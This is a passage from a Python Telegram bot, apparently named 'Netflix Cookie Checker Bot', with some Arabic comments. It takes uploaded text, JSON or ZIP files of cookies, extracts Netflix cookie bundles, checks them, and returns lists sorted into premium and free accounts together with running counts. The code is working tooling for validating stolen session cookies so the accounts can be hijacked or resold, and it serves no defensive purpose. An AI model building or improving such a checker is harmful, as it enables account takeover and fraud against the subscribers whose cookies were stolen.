            buf = BytesIO()
            buf.write(combined_premium.encode('utf-8'))
            buf.seek(0)
            await update.message.reply_document(
                document=buf, 
                filename="PREMIUM_ACCOUNTS.txt", 
                caption=f"💰 {premium_count} Premium Accounts Found"
            )
        
        # إرسال ملف FREE واحد (كل free accounts في ملف واحد)
        if all_free_results:
            combined_free = "".join(all_free_results)
            buf = BytesIO()
            buf.write(combined_free.encode('utf-8'))
            buf.seek(0)
            await update.message.reply_document(
                document=buf, 
                filename="FREE_ACCOUNTS.txt", 
                caption=f"🆓 {free_count} Free Accounts Found"
            )
    
    user_tasks[uid]['active'] = False


# ==================== ZIP FILE HANDLER ====================

async def handle_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stats
    uid = update.effective_user.id
    user_tasks[uid] = {'active': True, 'cancel': False}
    doc = update.message.document
    fname = doc.file_name
    start = time.time()
    
    if doc.file_size > 50 * 1024 * 1024:
        await update.message.reply_text("❌ File too large! Max 50MB")
        user_tasks[uid]['active'] = False
        return
    
    msg = await update.message.reply_text(f"📦 Processing ZIP...")
    file = await doc.get_file()
    zip_data = BytesIO()
    await file.download_to_memory(zip_data)
    
    all_premium_results = []
    all_free_results = []
    invalid_count = 0
    total_files = 0
    processed_files = 0
    premium_count = 0
    free_count = 0
    
    try:
        with zipfile.ZipFile(zip_data, 'r') as zf:
            files = [f for f in zf.namelist() if f.endswith(('.txt', '.json'))]
            total_files = len(files)
            
            if not files:
                await msg.edit_text("❌ No cookie files found in ZIP")
                user_tasks[uid]['active'] = False
                return
            
            mode = context.user_data.get('mode', 'fullinfo')
            
            for cf in files:
                if user_tasks[uid].get('cancel', False):
                    await msg.edit_text("⏹️ Cancelled")
                    break
                
                try:
                    content = zf.read(cf).decode('utf-8', errors='ignore')
                    bundles = extract_netflix_cookie_bundles(content)
                    
                    for bundle in bundles:
                        result, plan_key, result_type = await process_single_bundle(bundle, cf, 0, 0, mode)
                        
                        if result:
                            if result_type == "success":
                                all_premium_results.append(result)
                                premium_count += 1
                                stats['valid'] += 1
                            elif result_type == "free":
                                all_free_results.append(result)
                                free_count += 1
                                stats['free'] += 1
                        else:
                            invalid_count += 1
                            stats['failed'] += 1
                        stats['total'] += 1
                    
                    processed_files += 1
                    
                    if processed_files % 5 == 0:
                        await msg.edit_text(f"📦 Processed {processed_files}/{total_files} files...")
                        
                except Exception as e:
                    print(f"Error: {e}")
                    invalid_count += 1
                    processed_files += 1
        
        if not user_tasks[uid].get('cancel', False):
            elapsed = time.time() - start
            spd = total_files / elapsed if elapsed > 0 else 0
            
            final = f"""
✅ Processing Complete

Total Files: {total_files}
Premium Accounts: {premium_count}
Free Accounts: {free_count}
Invalid: {invalid_count}
Time: {elapsed:.2f}s | Speed: {spd:.2f} files/s
"""
            await msg.delete()
            await update.message.reply_text(final)
            
            if all_premium_results:
                combined = "".join(all_premium_results)
                buf = BytesIO()
                buf.write(combined.encode('utf-8'))
                buf.seek(0)
                await update.message.reply_document(document=buf, filename="PREMIUM_ACCOUNTS.txt", caption=f"💰 {premium_count} Premium Accounts")
            
            if all_free_results:
                combined = "".join(all_free_results)
                buf = BytesIO()
                buf.write(combined.encode('utf-8'))
                buf.seek(0)
                await update.message.reply_document(document=buf, filename="FREE_ACCOUNTS.txt", caption=f"🆓 {free_count} Free Accounts")
                
    except Exception as e:
        await msg.edit_text(f"❌ Error: {str(e)[:200]}")
    finally:
        user_tasks[uid]['active'] = False


async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    fname = update.message.document.file_name.lower()
    if fname.endswith('.zip'):
        await handle_zip_file(update, context)
    elif fname.endswith('.txt') or fname.endswith('.json'):
        await handle_single_file(update, context)
    else:
        await update.message.reply_text("❌ Send .txt, .json, or .zip files")

async def set_commands(app):
    await app.bot.set_my_commands([
        BotCommand("start", "Show menu"),
        BotCommand("help", "Instructions"),
        BotCommand("stats", "Statistics"),
        BotCommand("cancel", "Stop task"),
    ])


# ==================== MAIN ====================

def main():
    create_base_folders()
    print("\n" + "="*50)
    print("Netflix Cookie Checker Bot")
    print("="*50)
    
    # زيادة المهلة بشكل كبير عشان الملفات الكبيرة تتبعت
    request = HTTPXRequest(
        connect_timeout=90.0,
        read_timeout=300.0,
        write_timeout=180.0,
        pool_timeout=90.0,
    )
    
    app = Application.builder().token(BOT_TOKEN).request(request).build()
    
    app.add_handler(CommandHandler("start", bot_start))
    app.add_handler(CommandHandler("help", bot_help))
    app.add_handler(CommandHandler("stats", bot_stats))
    app.add_handler(CommandHandler("cancel", bot_cancel))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    
    try:
        asyncio.get_event_loop().run_until_complete(set_commands(app))
    except:
        pass
    
    print("✅ Bot is ready!")
    print("Press Ctrl+C to stop\n")
    app.run_polling()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nBot stopped")
